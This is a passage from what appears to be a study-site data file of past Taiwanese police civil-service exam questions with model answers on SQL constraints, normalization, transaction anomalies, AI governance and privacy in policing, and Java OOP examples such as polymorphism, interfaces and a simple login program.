    "html": "<div class=\"question-head\">\n            <span class=\"number\">三</span>\n            <div>\n              <h2>Primary Key、Not Null 與借閱資料級聯刪除</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              圖書館資料庫有 <code>BOOK</code> 與 <code>BORROWER</code> 表格。請說明 <code>primary key</code> 與 <code>not null</code> 對建立資料的限制，並修正 SQL，使 BOOK 某書資料被刪除時，BORROWER 中對應借閱資料也自動刪除。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>限制說明</h3>\n            <p>\n              <code>BOOK</code> 的主鍵是 <code>ISBN</code>，因此每本書的 ISBN 不可重複，也不可為 NULL。新增 BOOK 資料時，資料庫會拒絕 ISBN 空值或與既有 ISBN 相同的資料。\n            </p>\n            <p>\n              <code>BORROWER</code> 的主鍵是 <code>(No, ISBN)</code>，表示同一位借閱者與同一本書的組合不可重複，且 <code>No</code> 與 <code>ISBN</code> 都不可為 NULL。也就是說，不能建立沒有借閱者編號或沒有書籍 ISBN 的借閱紀錄，也不能重複建立相同借閱者借同一本書的紀錄。\n            </p>\n            <p>\n              <code>DueDate date not null</code> 表示到期日欄位一定要有值。新增 BORROWER 資料時，若未提供 <code>DueDate</code> 或填入 NULL，會違反 NOT NULL 限制。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>修正後 SQL</h3>\n            <pre><code>CREATE TABLE BOOK (\n  ISBN char(13),\n  Title varchar(20),\n  Publisher varchar(20),\n  Price numeric(8, 2),\n  PRIMARY KEY (ISBN)\n);\n\nCREATE TABLE BORROWER (\n  No char(5),\n  ISBN char(13),\n  DueDate date NOT NULL,\n  PRIMARY KEY (No, ISBN),\n  FOREIGN KEY (ISBN)\n    REFERENCES BOOK(ISBN)\n    ON DELETE CASCADE\n);</code></pre>\n            <p>\n              關鍵是替 <code>BORROWER.ISBN</code> 建立參考 <code>BOOK.ISBN</code> 的外鍵，並加上 <code>ON DELETE CASCADE</code>。如此當某筆 BOOK 資料被刪除時，所有引用該 ISBN 的借閱紀錄會由資料庫自動刪除。\n            </p>\n          </section>"
  },
  {
    "id": 45,
    "slug": "question-45",
    "title": "MongoDB 貼文資料轉換為 3NF 關聯設計",
    "points": "20 分",
    "year": "115年",
    "examName": "刑事警察人員考試",
    "grade": "三等",
    "category": "數位鑑識組",
    "subject": "資料庫管理與運用",
    "subjectSlug": "115-criminal-third-database-management",
    "order": "四",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">四</span>\n            <div>\n              <h2>MongoDB 貼文資料轉換為 3NF 關聯設計</h2>\n              <p>配分 20 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              原系統以 MongoDB 儲存貼文 JSON，一則貼文包含作者、內容、多個標籤、按讚者與建立時間。若改以關聯式資料庫實作，請設計符合 3NF 的關聯，列出欄位、主鍵、函數相依性，並說明為何符合 3NF。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>關聯設計</h3>\n            <pre><code>USER(\n  UserID PK,\n  UserName\n)\n\nPOST(\n  PostID PK,\n  AuthorID FK REFERENCES USER(UserID),\n  Content,\n  CreatedAt\n)\n\nTAG(\n  TagName PK\n)\n\nPOST_TAG(\n  PostID PK/FK REFERENCES POST(PostID),\n  TagName PK/FK REFERENCES TAG(TagName)\n)\n\nPOST_LIKE(\n  PostID PK/FK REFERENCES POST(PostID),\n  UserID PK/FK REFERENCES USER(UserID)\n)</code></pre>\n            <p>\n              範例中的作者 <code>a1 Mary</code> 可放入 USER；貼文主體放入 POST；<code>tags</code> 是多值屬性，拆成 TAG 與 POST_TAG；<code>likedby</code> 也是一篇貼文對多位使用者的多值關係，拆成 POST_LIKE。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>函數相依性</h3>\n            <ul>\n              <li><code>UserID → UserName</code></li>\n              <li><code>PostID → AuthorID, Content, CreatedAt</code></li>\n              <li><code>TagName → TagName</code>，標籤名稱本身作為識別。</li>\n              <li><code>(PostID, TagName)</code> 為 POST_TAG 的主鍵，沒有非鍵屬性。</li>\n              <li><code>(PostID, UserID)</code> 為 POST_LIKE 的主鍵，沒有非鍵屬性。</li>\n            </ul>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>符合 3NF 的理由</h3>\n            <p>\n              在 USER 中，使用者姓名只依賴使用者代號；在 POST 中，貼文內容、作者與建立時間只依賴貼文代號，不會把作者姓名重複存於每篇貼文，因此避免 <code>PostID → AuthorID → UserName</code> 的傳遞相依。標籤與按讚名單原本是陣列型多值資料，拆成交叉表後，每列只表示一個貼文與一個標籤或使用者的關係，符合第一正規化。\n            </p>\n            <p>\n              POST_TAG 與 POST_LIKE 的主鍵都是複合鍵，且沒有非鍵屬性，因此不會有部分相依或傳遞相依。各表中每個非鍵屬性都完全依賴該表的鍵，且不依賴其他非鍵屬性，所以整體設計符合 3NF。\n            </p>\n          </section>"
  },
  {
    "id": 46,
    "slug": "question-46",
    "title": "資料庫專有名詞：分散式資料庫、ACID、資料倉儲與 OLAP",
    "points": "25 分",
    "year": "115年",
    "examName": "一般警察人員考試",
    "grade": "三等",
    "category": "警察資訊管理人員",
    "subject": "資料庫應用",
    "subjectSlug": "115-police-third-database-application",
    "order": "一",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">一</span>\n            <div>\n              <h2>資料庫專有名詞：分散式資料庫、ACID、資料倉儲與 OLAP</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>闡述分散式資料庫、ACID、資料倉儲與線上分析處理（OLAP）的意涵。</p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>名詞說明</h3>\n            <ul><li><strong>分散式資料庫：</strong>資料實際儲存在不同節點或地點，但透過網路與分散式 DBMS 整合，讓使用者像操作單一資料庫一樣查詢與更新。重點在資料分散、位置透明、複製或分割管理，以及跨節點交易協調。</li><li><strong>Atomicity 原子性：</strong>交易中的所有操作視為不可分割的單位，要全部成功，要全部復原。</li><li><strong>Consistency 一致性：</strong>交易執行前後都必須讓資料庫維持完整性限制與商業規則，例如主鍵、外鍵與餘額不可為負等規則。</li><li><strong>Isolation 隔離性：</strong>多個交易並行時，中間結果不應互相干擾，結果應如同某種序列順序執行。</li><li><strong>Durability 持久性：</strong>交易一旦提交，結果即使遇到當機也要能透過日誌、備份或復原機制保存。</li><li><strong>資料倉儲：</strong>整合來自多個作業系統的歷史資料，通常具主題導向、整合性、時間變異與非揮發特性，用於決策分析而非日常交易處理。</li><li><strong>OLAP：</strong>線上分析處理，用多維度資料模型快速做彙總、切片、切塊、鑽研與樞紐分析，支援管理者從不同角度觀察趨勢。</li></ul>\n          </section>"
  },
  {
    "id": 47,
    "slug": "question-47",
    "title": "學生選課 ERD 與屬性設計",
    "points": "20 分",
    "year": "115年",
    "examName": "一般警察人員考試",
    "grade": "三等",
    "category": "警察資訊管理人員",
    "subject": "資料庫應用",
    "subjectSlug": "115-police-third-database-application",
    "order": "二",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">二</span>\n            <div>\n              <h2>學生選課 ERD 與屬性設計</h2>\n              <p>配分 20 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>一位學生可以選修多門課程，且至少必須選修一門課程；一門課程可以被多位學生選修，但也有可能沒有學生選修。請繪製 ERD，並列出學生與課程各 4 個屬性。</p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>ERD 關係</h3>\n            <pre class=\"diagram\">學生 Student 1..* ── 選修 Enroll ── 0..* 課程 Course</pre>\n            <p>學生與課程是多對多關係。學生端為必參與，因為每位學生至少選一門課；課程端為選擇參與，因為一門課可能尚未有學生選修。實作成關聯表時可設計為：</p>\n            <pre><code>Student(StudentID PK, Name, Department, Grade)\nCourse(CourseID PK, CourseName, Credits, Teacher)\nEnroll(StudentID FK, CourseID FK, EnrollDate, Score,\n       PK(StudentID, CourseID))</code></pre>\n            <h3>屬性說明</h3>\n            <ul><li><strong>學生 StudentID：</strong>學生唯一識別碼，可作為主鍵。</li><li><strong>學生 Name：</strong>學生姓名。</li><li><strong>學生 Department：</strong>所屬系所或班級，用於分類管理。</li><li><strong>學生 Grade：</strong>年級或就讀階段。</li><li><strong>課程 CourseID：</strong>課程唯一識別碼，可作為主鍵。</li><li><strong>課程 CourseName：</strong>課程名稱。</li><li><strong>課程 Credits：</strong>學分數，可用於畢業學分計算。</li><li><strong>課程 Teacher：</strong>授課教師或負責教師。</li></ul>\n          </section>"
  },
  {
    "id": 48,
    "slug": "question-48",
    "title": "Dirty Read 與 Lost Update 情境",
    "points": "20 分",
    "year": "115年",
    "examName": "一般警察人員考試",
    "grade": "三等",
    "category": "警察資訊管理人員",
    "subject": "資料庫應用",
    "subjectSlug": "115-police-third-database-application",
    "order": "三",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">三</span>\n            <div>\n              <h2>Dirty Read 與 Lost Update 情境</h2>\n              <p>配分 20 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>請闡述 Dirty Read 與 Lost Update 在資料庫交易隔離性不足時可能發生的情境。</p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>Dirty Read</h3>\n            <p>髒讀是指交易讀到另一個尚未提交交易的資料。若 T1 將帳戶餘額由 1000 改成 800 但尚未 commit，T2 立刻讀到 800 並據此產生報表；之後 T1 rollback，資料庫實際餘額回到 1000，T2 使用的 800 就是不可靠的中間結果。</p>\n            <h3>Lost Update</h3>\n            <p>更新遺失是指兩個交易根據同一筆舊值更新，後寫入者覆蓋先寫入者，使其中一個更新消失。例如庫存原為 10，T1 讀到 10 後準備扣 2，T2 也讀到 10 後準備扣 3。T1 寫回 8，T2 再寫回 7，最後結果為 7，但正確扣除 5 件後應為 5，T1 的扣 2 被覆蓋。</p>\n            <p>可用鎖定、較高隔離層級、版本控制或樂觀鎖檢查來避免這類問題。</p>\n          </section>"
  },
  {
    "id": 49,
    "slug": "question-49",
    "title": "選課表 BCNF 判斷與分解",
    "points": "20 分",
    "year": "115年",
    "examName": "一般警察人員考試",
    "grade": "三等",
    "category": "警察資訊管理人員",
    "subject": "資料庫應用",
    "subjectSlug": "115-police-third-database-application",
    "order": "四",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">四</span>\n            <div>\n              <h2>選課表 BCNF 判斷與分解</h2>\n              <p>配分 20 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>資料表屬性為 (StudentID, CourseID, Instructor)，主鍵為 (StudentID, CourseID)。規則：一位學生可修多門課、一門課可有多位學生修習、每一門課只由一位教師授課、每位教師只教一門課。請說明為何不符合 BCNF，並分解成 2 個表格。</p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>違反原因</h3>\n            <p>原表 R(StudentID, CourseID, Instructor) 的候選鍵可視為 (StudentID, CourseID)。但依題意有函數相依：</p>\n            <pre><code>CourseID -> Instructor\nInstructor -> CourseID</code></pre>\n            <p><code>CourseID</code> 與 <code>Instructor</code> 都不是原表的超鍵，卻能決定另一個非鍵屬性，因此違反 BCNF「每一個非平凡函數相依 X -> Y，X 必須是超鍵」的要求。</p>\n            <h3>BCNF 分解</h3>\n            <pre><code>Enrollment(StudentID, CourseID)\nPK: (StudentID, CourseID)\nFK: CourseID -> CourseInstructor.CourseID\n\nCourseInstructor(CourseID, Instructor)\nPK: CourseID\nUNIQUE: Instructor</code></pre>\n            <p>第一個表保留學生選課事實；第二個表描述課程與教師一對一對應，消除同一課程教師重複儲存造成的更新異常。</p>\n          </section>"
  },
  {
    "id": 50,
    "slug": "question-50",
    "title": "Orders 分組彙總與 HAVING 查詢結果",
    "points": "15 分",
    "year": "115年",
    "examName": "一般警察人員考試",
    "grade": "三等",
    "category": "警察資訊管理人員",
    "subject": "資料庫應用",
    "subjectSlug": "115-police-third-database-application",
    "order": "五",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">五</span>\n            <div>\n              <h2>Orders 分組彙總與 HAVING 查詢結果</h2>\n              <p>配分 15 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>針對 Orders 資料表執行 SQL：依 ProductCategory 分組，計算 SUM(TotalAmount) AS TotalSales，並只列出 SUM(TotalAmount) > 3000 的群組。請說明功能與結果集。</p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>SQL 功能</h3>\n            <p>此查詢會先依 <code>ProductCategory</code> 將訂單分組，再用 <code>SUM(TotalAmount)</code> 計算各產品類別銷售總額。<code>HAVING</code> 是分組後條件，因此只保留總銷售額大於 3000 的產品類別。</p>\n            <h3>計算</h3>\n            <ul><li>Laptop：1200 + 2400 + 1200 = 4800</li><li>Phone：800 + 2400 + 1600 = 4800</li><li>Tablet：500 + 1000 = 1500，不列出</li><li>Keyboard：500 + 300 = 800，不列出</li></ul>\n            <h3>結果集</h3>\n            <table>\n              <thead><tr><th>ProductCategory</th><th>TotalSales</th></tr></thead>\n              <tbody>\n                <tr><td>Laptop</td><td>4800.00</td></tr>\n                <tr><td>Phone</td><td>4800.00</td></tr>\n              </tbody>\n            </table>\n          </section>"
  }
,
  {
    "id": 51,
    "slug": "question-51",
    "title": "AI 智慧防詐分析與民眾服務系統規劃",
    "points": "30 分",
    "year": "115年",
    "examName": "一般警察人員考試",
    "grade": "三等",
    "category": "警察資訊管理人員",
    "subject": "資訊管理",
    "subjectSlug": "115-police-third-information-management",
    "order": "一",
    "html": `<div class="question-head">
            <span class="number">一</span>
            <div>
              <h2>AI 智慧防詐分析與民眾服務系統規劃</h2>
              <p>配分 30 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>警察機關欲整合 165 打詐儀錶板、AI 智能防詐客服互動資料、詐騙網址資料庫、詐騙電話、民眾報案資料、165 諮詢紀錄、歷史案件資料及跨機關通報資料，建置 AI 智慧防詐分析與民眾服務系統。請說明應蒐集資料與資料庫設計重點、資料治理策略與風險影響，以及效益評估指標與持續改善機制。</p>
          </section>

          <section class="answer-block">
            <h3>資料蒐集與資料庫設計</h3>
            <p>系統應蒐集詐騙網址、網域、IP、短網址、截圖、詐騙電話、通訊帳號、金融帳戶、虛擬貨幣錢包、民眾報案資料、165 諮詢紀錄、AI 客服對話、歷史案件、詐騙手法、受害金額、時間地點、平台來源、跨機關通報、處置紀錄及黑白名單異動紀錄。</p>
            <p>資料庫可設計 Case、Report、Consultation、FraudURL、FraudPhone、FraudAccount、ModusOperandi、AgencyNotice、AIInteraction、DispositionLog 等表格。設計重點包含主鍵與外鍵關聯、來源機關、時間戳記、可信度、狀態、版本、處置結果、稽核欄位，並支援全文搜尋、模糊比對、關聯圖譜與儀錶板彙總。</p>
          </section>

          <section class="answer-block">
            <h3>資料治理策略與風險</h3>
            <p>治理策略應包含資料權責分工、資料分類分級、品質規則、個資最小化、去識別化、加密、權限控管、生命週期、資料血緣、交換標準、模型訓練資料審查、來源可信度與更正撤回流程。</p>
            <p>治理品質佳，可降低錯誤封鎖網址、錯誤諮詢、誤導偵查、個資外洩、模型偏誤、跨機關資料不一致與稽核不合規風險。治理品質差，則可能造成民眾權益受損、偵查資源浪費、機關聲譽受損與法律責任。</p>
          </section>

          <section class="answer-block">
            <h3>效益評估與持續改善</h3>
            <p>效益指標可分為服務、偵防、資料與營運四類：AI 回應時間、一次解決率、轉人工比例、民眾滿意度、可疑網址命中率、詐騙電話命中率、報案分流正確率、預警提前量、資料完整率、重複率、錯誤率、更新延遲、模型誤判率、案件處理時間與跨機關通報時效。</p>
            <p>持續改善機制包括民眾評分、人工覆核、偵查結果回饋、跨機關回報、申訴更正、資料品質月報、模型漂移監控、紅隊測試、新興詐騙特徵更新、個資影響評估與教育訓練。</p>
          </section>`
  },
  {
    "id": 52,
    "slug": "question-52",
    "title": "數位憑證皮夾與選擇性揭露",
    "points": "20 分",
    "year": "115年",
    "examName": "一般警察人員考試",
    "grade": "三等",
    "category": "警察資訊管理人員",
    "subject": "資訊管理",
    "subjectSlug": "115-police-third-information-management",
    "order": "二",
    "html": `<div class="question-head">
            <span class="number">二</span>
            <div>
              <h2>數位憑證皮夾與選擇性揭露</h2>
              <p>配分 20 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>政府推動數位憑證皮夾以提升生活及業務辦理便利性，並強調資料自主權。請說明其基本概念、選擇性揭露如何降低個資風險，並從系統互通性與民眾信任評估導入時應注意的管理議題。</p>
          </section>

          <section class="answer-block">
            <h3>基本概念與選擇性揭露</h3>
            <p>數位憑證皮夾是讓民眾以手機或安全載具保存政府、學校、金融機構等可信發證者核發之數位憑證，例如身分、年齡、駕照、學歷、證照或資格證明。使用時由民眾決定是否出示，服務提供者再驗證發證者簽章與憑證有效性。</p>
            <p>選擇性揭露是只揭露辦理業務所需的最小資料。例如酒類購買只需證明已滿 18 歲，不必揭露完整生日、住址與身分證字號；申辦優惠只需證明具備資格，不必揭露完整戶籍資料。此機制可降低過度蒐集、資料外洩、二次利用與跨資料庫拼湊風險。</p>
          </section>

          <section class="answer-block">
            <h3>互通性管理議題</h3>
            <p>政府導入時須訂定憑證格式、簽章演算法、撤銷查詢、API、身分保證等級、跨機關資料交換、跨平台使用、國際標準相容與無障礙規範。若各機關各自建置，將造成重複驗證、使用體驗不一致、維護成本升高與服務無法互認。</p>
          </section>

          <section class="answer-block">
            <h3>民眾信任管理議題</h3>
            <p>信任建立在發證機關可信、皮夾安全、私鑰保護、遺失復原、明確同意、用途告知、查詢紀錄、資料保存期限、雙因子驗證、資安稽核與替代服務管道。政府應避免強迫數位化造成排除效果，並以透明治理、隱私設計與可申訴機制提升接受度。</p>
          </section>`
  },
  {
    "id": 53,
    "slug": "question-53",
    "title": "AI 新十大建設、AI 素養與警政機器人治理",
    "points": "30 分",
    "year": "115年",
    "examName": "一般警察人員考試",
    "grade": "三等",
    "category": "警察資訊管理人員",
    "subject": "資訊管理",
    "subjectSlug": "115-police-third-information-management",
    "order": "三",
    "html": `<div class="question-head">
            <span class="number">三</span>
            <div>
              <h2>AI 新十大建設、AI 素養與警政機器人治理</h2>
              <p>配分 30 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>我國推動人工智慧基本法與 AI 新十大建設。請從資訊管理觀點說明 AI 如何促成組織流程再造與數位轉型、警政機關如何提升人員 AI 素養與倫理教育，並以 AI 機器人導入警政勤務、災害防救或場域巡檢為例，分析效益、風險與治理對策。</p>
          </section>

          <section class="answer-block">
            <h3>AI 與流程再造</h3>
            <p>AI 可透過文件自動分類、影像辨識、語音轉文字、客服問答、案件風險評分、勤務派遣輔助與趨勢預測，將原本仰賴人工經驗與紙本流程的作業改為資料驅動流程。重點不是把舊流程電子化，而是重新設計資料流、責任分工、審核點與服務模式，形成即時化、預測化與跨機關協作的數位轉型。</p>
            <p>管理挑戰包括資料品質不足、系統整合困難、人員抗拒、責任歸屬不清、模型偏誤、個資與資安風險、黑箱決策、供應商依賴、績效指標錯置與法規遵循壓力。</p>
          </section>

          <section class="answer-block">
            <h3>AI 素養與倫理教育</h3>
            <p>警政機關應依人工智慧基本法強調的人本、安全、公平、透明、隱私保護、問責與包容精神，建立分級教育。一般人員需了解生成式 AI 限制、資料保密、輸出查證與不得輸入敏感個資；主管需了解導入評估、風險管理與績效監督；技術人員需熟悉資料治理、模型驗證、資安、偏誤測試與稽核紀錄。</p>
          </section>

          <section class="answer-block">
            <h3>AI 機器人應用治理</h3>
            <p>以災害防救或場域巡檢機器人為例，預期效益包含降低人員進入危險區域、即時回傳影像與感測資料、夜間巡檢、異常偵測、提升勤務覆蓋率與保存現場紀錄。潛在風險包含誤判、侵犯隱私、遭駭控制、定位資料外洩、設備失靈、過度監控疑慮與責任歸屬不明。</p>
            <p>治理對策包括明確用途限制、人員最終決策、敏感資料最小化、影像保存期限、加密與權限控管、模型驗證、例外通報、事件應變、設備維護、公開告知、外部稽核與定期成效評估。</p>
          </section>`
  },
  {
    "id": 54,
    "slug": "question-54",
    "title": "生成式 AI 濫用、資訊倫理與警政 AI 系統規範",
    "points": "20 分",
    "year": "115年",
    "examName": "一般警察人員考試",
    "grade": "三等",
    "category": "警察資訊管理人員",
    "subject": "資訊管理",
    "subjectSlug": "115-police-third-information-management",
    "order": "四",
    "html": `<div class="question-head">
            <span class="number">四</span>
            <div>
              <h2>生成式 AI 濫用、資訊倫理與警政 AI 系統規範</h2>
              <p>配分 20 分</p>
            </div>
          </div>

          <section class="prompt-block">
            <h3>題目</h3>
            <p>深偽影像、AI 變聲、個資拼圖等科技濫用日益嚴重。請說明其核心資訊倫理爭議與社會問題，並探討警察機關若導入 AI 通報、偵測與案件管理系統，應制定哪些作業規範與配套機制，以兼顧犯罪偵防與民眾個資保障。</p>
          </section>

          <section class="answer-block">
            <h3>資訊倫理爭議與社會問題</h3>
            <p>深偽影像與 AI 變聲可能造成身分冒用、名譽侵害、性影像濫用、投資詐騙、選舉操弄、證據可信度下降與社會信任瓦解。個資拼圖則可能把分散資料重新組合，形成可識別個人輪廓，衍生跟蹤、勒索、精準詐騙、差別待遇與寒蟬效應。</p>
            <p>核心倫理議題包括同意與自主權、隱私權、目的外利用、演算法偏誤、錯誤標記、平台責任、言論自由與犯罪防制界線、證據真實性，以及弱勢族群更容易受到科技濫用傷害。</p>
          </section>

          <section class="answer-block">
            <h3>警政 AI 系統作業規範</h3>
            <p>系統應建立明確法源與目的、必要性及比例原則審查、資料分類分級、案件編號、查詢理由、角色權限、操作紀錄、保存期限、刪除程序、人工覆核與信心水準標示。AI 偵測結果不得作為唯一執法依據，須由人員依證據法則與偵查程序再判斷。</p>
            <p>配套機制包括深偽鑑識流程、原始檔與雜湊值保存、證據鏈管理、模型偏誤測試、申訴與更正機制、資安防護、第三方稽核、個資影響評估、去識別化、跨機關資料交換協議、教育訓練、民眾告知與透明度報告。如此才能在提升偵防效率的同時，避免過度蒐集與濫用個資。</p>
          </section>`
  }
,
  {
    "id": 55,
    "slug": "question-55",
    "title": "多型的使用情境、功能、UML 與程式範例",
    "points": "30 分",
    "year": "115年",
    "examName": "一般警察人員考試",
    "grade": "三等考試",
    "category": "警察資訊管理人員類別",
    "subject": "物件導向程式設計",
    "subjectSlug": "115-general-police-third-oop",
    "order": "一",
    "html": "<div class=\"question-head\"><span class=\"number\">一</span><div><h2>多型的使用情境、功能、UML 與程式範例</h2><p>配分 30 分</p></div></div><section class=\"prompt-block\"><h3>題目</h3><p>請說明物件導向語言中多型（polymorphism）之前提（使用情境）和功能，並須繪製統一塑模語言（UML）之類別圖，進而舉簡潔範例程式碼說明之。</p></section><section class=\"answer-block\"><h3>前提與功能</h3><p>多型的前提通常是共同父類別或共同介面，加上子類別覆寫方法。程式以父類別或介面型別宣告變數，但執行時依實際物件型別呼叫對應方法，稱為動態繫結或晚期繫結。</p><p>多型可降低耦合、提升擴充性與可維護性。呼叫端不必判斷物件是哪一種具體類別，只要呼叫共同操作即可。例如付款系統可統一呼叫 <code>pay()</code>，實際上可能是信用卡、行動支付或現金付款。</p></section><section class=\"answer-block\"><h3>UML 類別圖</h3><pre class=\"tree-pre\"><code>        Payment\n      + pay(): void\n            ▲\n     ┌──────┴──────┐\nCreditCardPayment  LinePayPayment\n+ pay(): void      + pay(): void</code></pre></section><section class=\"answer-block\"><h3>Java 範例</h3><pre><code>abstract class Payment {\n    public abstract void pay();\n}\n\nclass CreditCardPayment extends Payment {\n    @Override\n    public void pay() {\n        System.out.println(\"使用信用卡付款\");\n    }\n}\n\nclass LinePayPayment extends Payment {\n    @Override\n    public void pay() {\n        System.out.println(\"使用 Line Pay 付款\");\n    }\n}\n\npublic class PolymorphismDemo {\n    public static void main(String[] args) {\n        Payment[] payments = {\n            new CreditCardPayment(),\n            new LinePayPayment()\n        };\n\n        for (Payment payment : payments) {\n            payment.pay();\n        }\n    }\n}</code></pre><p>陣列型別是 <code>Payment</code>，但每個元素實際指向不同子類別物件。迴圈中同樣呼叫 <code>pay()</code>，執行結果會依實際物件自動選擇不同方法，這就是多型。</p></section>"
  },
  {
    "id": 56,
    "slug": "question-56",
    "title": "介面的使用情境、功能、UML 與程式範例",
    "points": "30 分",
    "year": "115年",
    "examName": "一般警察人員考試",
    "grade": "三等考試",
    "category": "警察資訊管理人員類別",
    "subject": "物件導向程式設計",
    "subjectSlug": "115-general-police-third-oop",
    "order": "二",
    "html": "<div class=\"question-head\"><span class=\"number\">二</span><div><h2>介面的使用情境、功能、UML 與程式範例</h2><p>配分 30 分</p></div></div><section class=\"prompt-block\"><h3>題目</h3><p>請說明物件導向語言中 interface 之前提（使用情境）和功能，並須繪製統一塑模語言（UML）之類別圖，進而舉簡潔範例程式碼說明之。</p></section><section class=\"answer-block\"><h3>前提與功能</h3><p>介面適用於多個類別沒有共同父類別實作，但需要遵守相同能力規格的情境。介面定義能做什麼，實作類別決定怎麼做。例如印表機、PDF 產生器、螢幕輸出器都可以具有 <code>print()</code> 能力，但內部實作不同。</p><p>介面的功能包括規範行為、支援多型、降低相依性、方便單元測試與替換實作。程式可依賴介面而非具體類別，符合依賴反轉原則。</p></section><section class=\"answer-block\"><h3>UML 類別圖</h3><pre class=\"tree-pre\"><code>      «interface»\n       Printable\n     + print(): void\n          △  △\n          │  │\n   ReportPrinter   PdfPrinter\n   + print(): void + print(): void</code></pre></section><section class=\"answer-block\"><h3>Java 範例</h3><pre><code>interface Printable {\n    void print();\n}\n\nclass ReportPrinter implements Printable {\n    @Override\n    public void print() {\n        System.out.println(\"列印紙本報表\");\n    }\n}\n\nclass PdfPrinter implements Printable {\n    @Override\n    public void print() {\n        System.out.println(\"輸出 PDF 檔案\");\n    }\n}\n\npublic class InterfaceDemo {\n    static void executePrint(Printable printer) {\n        printer.print();\n    }\n\n    public static void main(String[] args) {\n        executePrint(new ReportPrinter());\n        executePrint(new PdfPrinter());\n    }\n}</code></pre><p><code>executePrint</code> 只依賴 <code>Printable</code> 介面，因此未來新增其他列印方式時，不必修改呼叫端流程，只需新增實作類別。</p></section>"
  },
  {
    "id": 57,
    "slug": "question-57",
    "title": "User 與 Vuser 登入程式設計",
    "points": "40 分",
    "year": "115年",
    "examName": "一般警察人員考試",
    "grade": "三等考試",
    "category": "警察資訊管理人員類別",
    "subject": "物件導向程式設計",
    "subjectSlug": "115-general-police-third-oop",
    "order": "三",
    "html": "<div class=\"question-head\"><span class=\"number\">三</span><div><h2>User 與 Vuser 登入程式設計</h2><p>配分 40 分</p></div></div><section class=\"prompt-block\"><h3>題目</h3><p>請以物件導向語言設計一個簡易文字模式介面的登入程式。程式需包含一般使用者（User）與高階使用者（Vuser）二個類別。一般使用者包含 Name、Passwd；高階使用者包含 Name、Vpasswd、Vp。密碼皆十個字元，安全密碼必須含有英文大小寫和數字。需繪製 UML 類別圖並撰寫完整程式碼驗證正確性。</p></section><section class=\"answer-block\"><h3>UML 類別圖</h3><pre class=\"tree-pre\"><code>User\n- name: String\n- passwd: String\n+ User(name, passwd)\n+ isPasswordValid(): boolean\n+ login(inputPassword): boolean\n+ getName(): String\n        ▲\n        │\nVuser\n- vpasswd: String\n- vp: int\n+ Vuser(name, vpasswd, vp)\n+ isPasswordValid(): boolean\n+ getVp(): int</code></pre><p>高階使用者可視為一般使用者的一種，因此設計為 <code>Vuser extends User</code>。安全密碼規則比一般密碼嚴格，故覆寫 <code>isPasswordValid()</code>。</p></section><section class=\"answer-block\"><h3>Java 完整程式碼</h3><pre><code>import java.util.Scanner;\n\nclass User {\n    private final String name;\n    private final String passwd;\n\n    public User(String name, String passwd) {\n        this.name = name;\n        this.passwd = passwd;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public boolean isPasswordValid() {\n        return passwd != null && passwd.length() == 10;\n    }\n\n    public boolean login(String inputPassword) {\n        return isPasswordValid() && passwd.equals(inputPassword);\n    }\n}\n\nclass Vuser extends User {\n    private final String vpasswd;\n    private final int vp;\n\n    public Vuser(String name, String vpasswd, int vp) {\n        super(name, vpasswd);\n        this.vpasswd = vpasswd;\n        this.vp = vp;\n    }\n\n    public int getVp() {\n        return vp;\n    }\n\n    @Override\n    public boolean isPasswordValid() {\n        if (vpasswd == null || vpasswd.length() != 10) return false;\n\n        boolean hasUpper = false;\n        boolean hasLower = false;\n        boolean hasDigit = false;\n\n        for (char ch : vpasswd.toCharArray()) {\n            if (Character.isUpperCase(ch)) hasUpper = true;\n            if (Character.isLowerCase(ch)) hasLower = true;\n            if (Character.isDigit(ch)) hasDigit = true;\n        }\n\n        return hasUpper && hasLower && hasDigit;\n    }\n}\n\npublic class LoginProgram {\n    public static void main(String[] args) {\n        User normalUser = new User(\"Alice\", \"abcdefghij\");\n        Vuser advancedUser = new Vuser(\"Bob\", \"Abcdef1234\", 5);\n\n        System.out.println(\"一般使用者密碼格式：\" + normalUser.isPasswordValid());\n        System.out.println(\"高階使用者密碼格式：\" + advancedUser.isPasswordValid());\n\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"請輸入使用者姓名：\");\n        String name = scanner.nextLine();\n        System.out.print(\"請輸入密碼：\");\n        String password = scanner.nextLine();\n\n        if (name.equals(normalUser.getName()) && normalUser.login(password)) {\n            System.out.println(\"一般使用者登入成功\");\n        } else if (name.equals(advancedUser.getName()) && advancedUser.login(password)) {\n            System.out.println(\"高階使用者登入成功，權限等級：\" + advancedUser.getVp());\n        } else {\n            System.out.println(\"登入失敗\");\n        }\n\n        scanner.close();\n    }\n}</code></pre></section><section class=\"answer-block\"><h3>驗證說明</h3><ul><li>一般密碼 <code>abcdefghij</code> 